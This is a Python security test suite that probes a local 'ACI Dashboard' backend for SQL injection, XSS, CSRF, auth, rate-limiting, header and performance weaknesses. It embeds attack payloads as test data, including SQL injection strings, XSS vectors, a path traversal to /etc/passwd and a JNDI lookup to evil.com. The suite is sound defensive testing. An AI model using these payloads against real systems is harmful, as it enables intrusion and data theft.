#!/usr/bin/env python3
"""
Comprehensive Security Testing Suite for ACI Dashboard
Tests all ACI Security Standards implementation
"""

import asyncio
import json
import time
import requests
import subprocess
import sys
from pathlib import Path
from typing import Dict, List, Any, Tuple
import logging
from datetime import datetime
import pytest
import asyncio
from sqlalchemy.exc import SQLAlchemyError

# Test configuration
BASE_URL = "http://localhost:2003"  # Backend URL
FRONTEND_URL = "http://localhost:2005"  # Frontend URL
TEST_TIMEOUT = 30
MAX_CONCURRENT_REQUESTS = 50

logger = logging.getLogger(__name__)

class SecurityTestSuite:
    """Comprehensive security testing suite"""
    
    def __init__(self, base_url: str = BASE_URL):
        self.base_url = base_url
        self.results = {
            "timestamp": datetime.now().isoformat(),
            "cybersecurity_tests": {},
            "quality_tests": {},
            "performance_tests": {},
            "overall_score": 0,
            "passed_tests": 0,
            "failed_tests": 0,
            "total_tests": 0
        }
        
    async def run_all_tests(self) -> Dict[str, Any]:
        """Run comprehensive security test suite"""
        print("🧪 Starting ACI Security Test Suite...")
        
        # Test categories
        await self.test_cybersecurity()
        await self.test_quality()
        await self.test_performance()
        
        # Calculate results
        self.calculate_results()
        
        print("✅ Security Test Suite Complete")
        return self.results
    
    async def test_cybersecurity(self):
        """Test cybersecurity pillar"""
        print("🛡️  Testing Cybersecurity Controls...")
        
        tests = [
            ("SQL Injection Protection", self.test_sql_injection_protection),
            ("XSS Protection", self.test_xss_protection),
            ("CSRF Protection", self.test_csrf_protection),
            ("Authentication Security", self.test_authentication_security),
            ("Authorization Controls", self.test_authorization_controls),
            ("Input Validation", self.test_input_validation),
            ("Rate Limiting", self.test_rate_limiting),
            ("Security Headers", self.test_security_headers),
            ("HTTPS Enforcement", self.test_https_enforcement),
            ("Password Security", self.test_password_security)
        ]
        
        results = {}
        for test_name, test_func in tests:
            try:
                result = await test_func()
                results[test_name] = result
                status = "✅ PASS" if result["passed"] else "❌ FAIL"
                print(f"  {status} {test_name}")
            except Exception as e:
                results[test_name] = {"passed": False, "error": str(e)}
                print(f"  ❌ ERROR {test_name}: {str(e)}")
        
        self.results["cybersecurity_tests"] = results
    
    async def test_sql_injection_protection(self) -> Dict[str, Any]:
        """Test SQL injection protection"""
        test_payloads = [
            "' OR '1'='1",
            "'; DROP TABLE users;--",
            "' UNION SELECT * FROM users--",
            "admin'--",
            "' OR 1=1#",
            "'; INSERT INTO users VALUES('hacker','pass');--",
            "1' AND (SELECT COUNT(*) FROM users) > 0--",
            "' OR SLEEP(5)--"
        ]
        
        vulnerabilities_found = []
        
        for payload in test_payloads:
            try:
                # Test search endpoint
                response = requests.get(
                    f"{self.base_url}/api/v1/users/search",
                    params={"q": payload},
                    timeout=5
                )
                
                # Check if payload was blocked or sanitized
                if response.status_code == 400 and "security" in response.text.lower():
                    continue  # Good - blocked
                elif response.status_code == 200:
                    # Check if response contains sensitive data
                    if "password" in response.text.lower() or "hash" in response.text.lower():
                        vulnerabilities_found.append(f"SQL injection possible with payload: {payload}")
                
            except requests.exceptions.RequestException:
                continue  # Timeout or error is acceptable
        
        return {
            "passed": len(vulnerabilities_found) == 0,
            "vulnerabilities": vulnerabilities_found,
            "payloads_tested": len(test_payloads)
        }
    
    async def test_xss_protection(self) -> Dict[str, Any]:
        """Test XSS protection"""
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src=javascript:alert('XSS')></iframe>",
            "<body onload=alert('XSS')>",
            "<div onclick=alert('XSS')>Click me</div>",
            "';alert('XSS');//"
        ]
        
        vulnerabilities_found = []
        
        for payload in xss_payloads:
            try:
                # Test user creation endpoint
                response = requests.post(
                    f"{self.base_url}/api/v1/users",
                    json={"full_name": payload, "email": "test@test.com"},
                    timeout=5
                )
                
                # Check if payload was properly escaped in response
                if response.status_code == 200:
                    if payload in response.text and "<script>" in payload:
                        vulnerabilities_found.append(f"XSS possible with payload: {payload}")
                
            except requests.exceptions.RequestException:
                continue
        
        return {
            "passed": len(vulnerabilities_found) == 0,
            "vulnerabilities": vulnerabilities_found,
            "payloads_tested": len(xss_payloads)
        }
    
    async def test_csrf_protection(self) -> Dict[str, Any]:
        """Test CSRF protection"""
        try:
            # Try to perform state-changing operation without CSRF token
            response = requests.post(
                f"{self.base_url}/api/v1/users",
                json={"full_name": "CSRF Test", "email": "csrf@test.com"},
                headers={"Origin": "http://evil-site.com"},
                timeout=5
            )
            
            # Should be blocked due to CORS/CSRF protection
            csrf_protected = response.status_code in [403, 401, 400]
            
            return {
                "passed": csrf_protected,
                "status_code": response.status_code,
                "details": "CSRF protection working" if csrf_protected else "CSRF vulnerability detected"
            }
            
        except requests.exceptions.RequestException as e:
            return {"passed": True, "details": f"Request blocked: {str(e)}"}
    
    async def test_authentication_security(self) -> Dict[str, Any]:
        """Test authentication security"""
        tests = []
        
        # Test 1: Brute force protection
        login_attempts = []
        for i in range(10):
            try:
                response = requests.post(
                    f"{self.base_url}/api/v1/auth/login",
                    json={"username": "admin", "password": f"wrong_password_{i}"},
                    timeout=3
                )
                login_attempts.append(response.status_code)
            except:
                break
        
        # After multiple failed attempts, should get rate limited
        brute_force_protected = any(code == 429 for code in login_attempts[-3:])
        tests.append(("Brute Force Protection", brute_force_protected))
        
        # Test 2: Password requirements
        try:
            response = requests.post(
                f"{self.base_url}/api/v1/users",
                json={"username": "weakuser", "password": "123", "email": "weak@test.com"},
                timeout=5
            )
            weak_password_rejected = response.status_code == 400
        except:
            weak_password_rejected = True
        
        tests.append(("Weak Password Rejection", weak_password_rejected))
        
        # Test 3: Session security
        try:
            response = requests.get(
                f"{self.base_url}/api/v1/users/me",
                headers={"Authorization": "Bearer invalid_token"},
                timeout=5
            )
            invalid_token_rejected = response.status_code in [401, 403]
        except:
            invalid_token_rejected = True
        
        tests.append(("Invalid Token Rejection", invalid_token_rejected))
        
        return {
            "passed": all(result for _, result in tests),
            "test_results": dict(tests),
            "details": f"{sum(1 for _, result in tests if result)}/{len(tests)} tests passed"
        }
    
    async def test_authorization_controls(self) -> Dict[str, Any]:
        """Test authorization controls"""
        try:
            # Try to access admin endpoint without proper permissions
            response = requests.get(
                f"{self.base_url}/api/v1/admin/users",
                timeout=5
            )
            
            # Should be unauthorized
            unauthorized_blocked = response.status_code in [401, 403]
            
            return {
                "passed": unauthorized_blocked,
                "status_code": response.status_code,
                "details": "Authorization working" if unauthorized_blocked else "Authorization bypass detected"
            }
            
        except requests.exceptions.RequestException as e:
            return {"passed": True, "details": f"Access properly blocked: {str(e)}"}
    
    async def test_input_validation(self) -> Dict[str, Any]:
        """Test input validation"""
        test_cases = [
            # Oversized input
            {"field": "full_name", "value": "x" * 10000, "should_reject": True},
            # Special characters
            {"field": "username", "value": "user<script>", "should_reject": True},
            # Email validation
            {"field": "email", "value": "invalid-email", "should_reject": True},
            # Null bytes
            {"field": "full_name", "value": "test\x00user", "should_reject": True}
        ]
        
        validation_working = []
        
        for case in test_cases:
            try:
                response = requests.post(
                    f"{self.base_url}/api/v1/users",
                    json={case["field"]: case["value"], "email": "test@test.com"},
                    timeout=5
                )
                
                rejected = response.status_code == 400 or response.status_code == 422
                validation_working.append(rejected == case["should_reject"])
                
            except requests.exceptions.RequestException:
                validation_working.append(True)  # Request blocked is good
        
        return {
            "passed": all(validation_working),
            "test_cases_passed": sum(validation_working),
            "total_test_cases": len(test_cases)
        }
    
    async def test_rate_limiting(self) -> Dict[str, Any]:
        """Test rate limiting"""
        start_time = time.time()
        responses = []
        
        # Send rapid requests
        for i in range(100):
            try:
                response = requests.get(
                    f"{self.base_url}/health",
                    timeout=1
                )
                responses.append(response.status_code)
                
                # Stop if rate limited
                if response.status_code == 429:
                    break
                    
            except requests.exceptions.RequestException:
                break
        
        # Check if rate limiting kicked in
        rate_limited = any(code == 429 for code in responses)
        
        return {
            "passed": rate_limited,
            "requests_sent": len(responses),
            "rate_limited_after": responses.index(429) + 1 if rate_limited else None,
            "time_taken": time.time() - start_time
        }
    
    async def test_security_headers(self) -> Dict[str, Any]:
        """Test security headers"""
        try:
            response = requests.get(f"{self.base_url}/health", timeout=5)
            
            required_headers = [
                "X-Content-Type-Options",
                "X-Frame-Options", 
                "X-XSS-Protection",
                "Strict-Transport-Security",
                "Content-Security-Policy"
            ]
            
            present_headers = []
            for header in required_headers:
                if header.lower() in [h.lower() for h in response.headers.keys()]:
                    present_headers.append(header)
            
            return {
                "passed": len(present_headers) >= 3,  # At least 3 security headers
                "present_headers": present_headers,
                "missing_headers": list(set(required_headers) - set(present_headers))
            }
            
        except requests.exceptions.RequestException as e:
            return {"passed": False, "error": str(e)}
    
    async def test_https_enforcement(self) -> Dict[str, Any]:
        """Test HTTPS enforcement"""
        if self.base_url.startswith("https://"):
            return {"passed": True, "details": "Using HTTPS"}
        else:
            # In development, HTTP is acceptable but should redirect to HTTPS in production
            try:
                http_url = self.base_url.replace("https://", "http://")
                response = requests.get(f"{http_url}/health", timeout=5, allow_redirects=False)
                
                # Check if redirected to HTTPS
                https_redirect = response.status_code in [301, 302, 307, 308] and \
                               response.headers.get("Location", "").startswith("https://")
                
                return {
                    "passed": https_redirect,
                    "status_code": response.status_code,
                    "location": response.headers.get("Location", ""),
                    "details": "HTTPS redirect working" if https_redirect else "HTTPS not enforced"
                }
                
            except requests.exceptions.RequestException:
                return {"passed": False, "details": "HTTP connection failed"}
    
    async def test_password_security(self) -> Dict[str, Any]:
        """Test password security requirements"""
        weak_passwords = [
            "123456",
            "password",
            "qwerty",
            "abc123",
            "Password1",  # Common pattern
            "12345678",   # Only numbers
            "abcdefgh",   # Only letters
        ]
        
        rejected_count = 0
        
        for weak_password in weak_passwords:
            try:
                response = requests.post(
                    f"{self.base_url}/api/v1/users",
                    json={
                        "username": f"user_{weak_password}",
                        "password": weak_password,
                        "email": f"user_{weak_password}@test.com",
                        "full_name": "Test User"
                    },
                    timeout=5
                )
                
                if response.status_code in [400, 422]:  # Password rejected
                    rejected_count += 1
                    
            except requests.exceptions.RequestException:
                rejected_count += 1  # Request blocked is good
        
        return {
            "passed": rejected_count >= len(weak_passwords) * 0.8,  # 80% should be rejected
            "weak_passwords_rejected": rejected_count,
            "total_weak_passwords": len(weak_passwords),
            "rejection_rate": rejected_count / len(weak_passwords) * 100
        }
    
    async def test_quality(self):
        """Test quality pillar"""
        print("📊 Testing Quality Controls...")
        
        tests = [
            ("Error Handling", self.test_error_handling),
            ("Input Sanitization", self.test_input_sanitization),
            ("API Response Security", self.test_api_response_security),
            ("Logging Security", self.test_logging_security)
        ]
        
        results = {}
        for test_name, test_func in tests:
            try:
                result = await test_func()
                results[test_name] = result
                status = "✅ PASS" if result["passed"] else "❌ FAIL"
                print(f"  {status} {test_name}")
            except Exception as e:
                results[test_name] = {"passed": False, "error": str(e)}
                print(f"  ❌ ERROR {test_name}: {str(e)}")
        
        self.results["quality_tests"] = results
    
    async def test_error_handling(self) -> Dict[str, Any]:
        """Test error handling doesn't expose sensitive information"""
        try:
            # Try to trigger various errors
            error_tests = [
                (f"{self.base_url}/api/v1/nonexistent", 404),
                (f"{self.base_url}/api/v1/users/99999", 404),
            ]
            
            secure_errors = []
            
            for url, expected_status in error_tests:
                response = requests.get(url, timeout=5)
                
                # Check that error doesn't expose sensitive info
                sensitive_keywords = [
                    "traceback", "exception", "sql", "database", "password",
                    "secret", "key", "token", "internal", "stack", "file",
                    "directory", "path", "server", "debug"
                ]
                
                response_lower = response.text.lower()
                sensitive_exposed = any(keyword in response_lower for keyword in sensitive_keywords)
                
                secure_errors.append({
                    "url": url,
                    "status": response.status_code,
                    "secure": not sensitive_exposed,
                    "exposed_keywords": [kw for kw in sensitive_keywords if kw in response_lower]
                })
            
            all_secure = all(error["secure"] for error in secure_errors)
            
            return {
                "passed": all_secure,
                "error_tests": secure_errors,
                "details": f"{sum(1 for e in secure_errors if e['secure'])}/{len(secure_errors)} errors handled securely"
            }
            
        except Exception as e:
            return {"passed": False, "error": str(e)}
    
    async def test_input_sanitization(self) -> Dict[str, Any]:
        """Test that inputs are properly sanitized"""
        malicious_inputs = [
            "<script>alert('xss')</script>",
            "'; DROP TABLE users; --",
            "../../../etc/passwd",
            "${jndi:ldap://evil.com/a}",
            "{{7*7}}",  # Template injection
            "%3Cscript%3Ealert('xss')%3C/script%3E"  # URL encoded
        ]
        
        sanitized_count = 0
        
        for malicious_input in malicious_inputs:
            try:
                response = requests.post(
                    f"{self.base_url}/api/v1/users/search",
                    json={"query": malicious_input},
                    timeout=5
                )
                
                # Check if input was sanitized in response
                if response.status_code == 200:
                    if malicious_input not in response.text:
                        sanitized_count += 1
                else:
                    sanitized_count += 1  # Blocked is also good
                    
            except requests.exceptions.RequestException:
                sanitized_count += 1  # Request blocked is good
        
        return {
            "passed": sanitized_count >= len(malicious_inputs) * 0.9,  # 90% should be handled
            "inputs_handled_safely": sanitized_count,
            "total_malicious_inputs": len(malicious_inputs),
            "safety_rate": sanitized_count / len(malicious_inputs) * 100
        }
    
    async def test_api_response_security(self) -> Dict[str, Any]:
        """Test API responses don't leak sensitive information"""
        try:
            response = requests.get(f"{self.base_url}/api/v1/users", timeout=5)
            
            # Check for sensitive data in response
            sensitive_fields = [
                "password", "password_hash", "secret", "key", "token",
                "private_key", "api_key", "database_url", "internal"
            ]
            
            response_lower = response.text.lower() if response.status_code == 200 else ""
            leaked_fields = [field for field in sensitive_fields if field in response_lower]
            
            return {
                "passed": len(leaked_fields) == 0,
                "leaked_fields": leaked_fields,
                "response_status": response.status_code
            }
            
        except requests.exceptions.RequestException as e:
            return {"passed": True, "details": f"API not accessible: {str(e)}"}
    
    async def test_logging_security(self) -> Dict[str, Any]:
        """Test that logging doesn't expose sensitive information"""
        # This would need access to log files in a real implementation
        # For now, we'll test that sensitive data isn't returned in responses
        
        try:
            # Make a request that might trigger logging
            response = requests.post(
                f"{self.base_url}/api/v1/auth/login",
                json={"username": "testuser", "password": "testpass123!"},
                timeout=5
            )
            
            # Check that password isn't echoed back
            password_in_response = "testpass123!" in response.text
            
            return {
                "passed": not password_in_response,
                "details": "Password not exposed in response" if not password_in_response else "Password found in response"
            }
            
        except requests.exceptions.RequestException:
            return {"passed": True, "details": "Login endpoint properly protected"}
    
    async def test_performance(self):
        """Test performance pillar"""
        print("🚀 Testing Performance Controls...")
        
        tests = [
            ("Response Time", self.test_response_time),
            ("Concurrent Load", self.test_concurrent_load),
            ("DoS Protection", self.test_dos_protection),
            ("Resource Usage", self.test_resource_usage)
        ]
        
        results = {}
        for test_name, test_func in tests:
            try:
                result = await test_func()
                results[test_name] = result
                status = "✅ PASS" if result["passed"] else "❌ FAIL"
                print(f"  {status} {test_name}")
            except Exception as e:
                results[test_name] = {"passed": False, "error": str(e)}
                print(f"  ❌ ERROR {test_name}: {str(e)}")
        
        self.results["performance_tests"] = results
    
    async def test_response_time(self) -> Dict[str, Any]:
        """Test API response times"""
        response_times = []
        
        for _ in range(10):
            start_time = time.time()
            try:
                response = requests.get(f"{self.base_url}/health", timeout=5)
                response_time = (time.time() - start_time) * 1000  # Convert to ms
                response_times.append(response_time)
            except requests.exceptions.RequestException:
                response_times.append(5000)  # Max timeout
        
        avg_response_time = sum(response_times) / len(response_times)
        p95_response_time = sorted(response_times)[int(len(response_times) * 0.95)]
        
        return {
            "passed": p95_response_time < 300,  # ACI standard: P95 < 300ms
            "average_response_time": avg_response_time,
            "p95_response_time": p95_response_time,
            "all_response_times": response_times
        }
    
    async def test_concurrent_load(self) -> Dict[str, Any]:
        """Test concurrent request handling"""
        import asyncio
        import aiohttp
        
        async def make_request(session):
            try:
                async with session.get(f"{self.base_url}/health") as response:
                    return response.status, time.time()
            except:
                return 500, time.time()
        
        start_time = time.time()
        
        async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=5)) as session:
            tasks = [make_request(session) for _ in range(50)]
            results = await asyncio.gather(*tasks, return_exceptions=True)
        
        end_time = time.time()
        
        successful_requests = sum(1 for r in results if isinstance(r, tuple) and r[0] == 200)
        total_time = end_time - start_time
        
        return {
            "passed": successful_requests >= 40,  # 80% success rate
            "successful_requests": successful_requests,
            "total_requests": len(results),
            "success_rate": successful_requests / len(results) * 100,
            "total_time": total_time
        }
    
    async def test_dos_protection(self) -> Dict[str, Any]:
        """Test DoS protection mechanisms"""
        # Test large payload rejection
        large_payload = {"data": "x" * 1000000}  # 1MB
        
        try:
            response = requests.post(
                f"{self.base_url}/api/v1/users",
                json=large_payload,
                timeout=5
            )
            
            large_payload_blocked = response.status_code in [413, 400, 429]
            
        except requests.exceptions.RequestException:
            large_payload_blocked = True  # Connection refused/timeout is good
        
        # Test rapid repeated requests (different from rate limiting test)
        rapid_requests = []
        for _ in range(20):
            try:
                response = requests.get(f"{self.base_url}/health", timeout=1)
                rapid_requests.append(response.status_code)
            except:
                break
        
        dos_protection_active = any(code == 429 for code in rapid_requests)
        
        return {
            "passed": large_payload_blocked and dos_protection_active,
            "large_payload_blocked": large_payload_blocked,
            "dos_protection_active": dos_protection_active,
            "rapid_requests_sent": len(rapid_requests)
        }
    
    async def test_resource_usage(self) -> Dict[str, Any]:
        """Test resource usage efficiency"""
        # Simple resource usage test by measuring response times under load
        single_request_time = []
        concurrent_request_time = []
        
        # Single request timing
        for _ in range(5):
            start = time.time()
            try:
                requests.get(f"{self.base_url}/health", timeout=5)
                single_request_time.append(time.time() - start)
            except:
                single_request_time.append(5.0)
        
        # Concurrent request timing (simplified)
        start = time.time()
        try:
            import concurrent.futures
            with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
                futures = [
                    executor.submit(requests.get, f"{self.base_url}/health", timeout=5) 
                    for _ in range(10)
                ]
                concurrent.futures.wait(futures)
            concurrent_time = time.time() - start
            concurrent_request_time.append(concurrent_time / 10)  # Average per request
        except:
            concurrent_request_time.append(5.0)
        
        avg_single = sum(single_request_time) / len(single_request_time)
        avg_concurrent = sum(concurrent_request_time) / len(concurrent_request_time)
        
        # Resource usage is good if concurrent performance doesn't degrade significantly
        performance_degradation = (avg_concurrent - avg_single) / avg_single * 100
        
        return {
            "passed": performance_degradation < 200,  # Less than 200% degradation
            "average_single_request_time": avg_single,
            "average_concurrent_request_time": avg_concurrent,
            "performance_degradation_percent": performance_degradation
        }
    
    def calculate_results(self):
        """Calculate overall test results"""
        all_tests = []
        
        # Collect all test results
        for category in ["cybersecurity_tests", "quality_tests", "performance_tests"]:
            for test_name, test_result in self.results[category].items():
                all_tests.append(test_result.get("passed", False))
        
        self.results["total_tests"] = len(all_tests)
        self.results["passed_tests"] = sum(all_tests)
        self.results["failed_tests"] = len(all_tests) - sum(all_tests)
        
        # Calculate score
        if len(all_tests) > 0:
            self.results["overall_score"] = (sum(all_tests) / len(all_tests)) * 100
        else:
            self.results["overall_score"] = 0
    
    def save_results(self, filename: str):
        """Save test results to file"""
        with open(filename, 'w') as f:
            json.dump(self.results, f, indent=2, default=str)
        print(f"📄 Test results saved to: {filename}")


async def main():
    """Main test runner"""
    if len(sys.argv) > 1:
        base_url = sys.argv[1]
    else:
        base_url = BASE_URL
    
    print(f"🧪 ACI Security Test Suite")
    print(f"Target: {base_url}")
    print("="*50)
    
    # Run tests
    test_suite = SecurityTestSuite(base_url)
    results = await test_suite.run_all_tests()
    
    # Save results
    test_suite.save_results("aci_security_test_results.json")
    
    # Print summary
    print("\n" + "="*50)
    print("🧪 ACI SECURITY TEST SUMMARY")
    print("="*50)
    print(f"Overall Score: {results['overall_score']:.1f}%")
    print(f"Tests Passed: {results['passed_tests']}/{results['total_tests']}")
    print(f"Tests Failed: {results['failed_tests']}")
    
    # Category breakdown
    for category in ["cybersecurity_tests", "quality_tests", "performance_tests"]:
        category_tests = results[category]
        passed = sum(1 for test in category_tests.values() if test.get("passed", False))
        total = len(category_tests)
        print(f"{category.replace('_', ' ').title()}: {passed}/{total}")
    
    # Determine pass/fail
    passing_threshold = 80  # 80% of tests must pass
    overall_pass = results['overall_score'] >= passing_threshold
    
    print(f"\n🎯 ACI SECURITY COMPLIANCE: {'✅ PASS' if overall_pass else '❌ FAIL'}")
    print(f"🚀 PRODUCTION READY: {'YES' if overall_pass else '❌ NO - Address failing tests'}")
    
    return 0 if overall_pass else 1


if __name__ == "__main__":
    exit(asyncio.run(main()))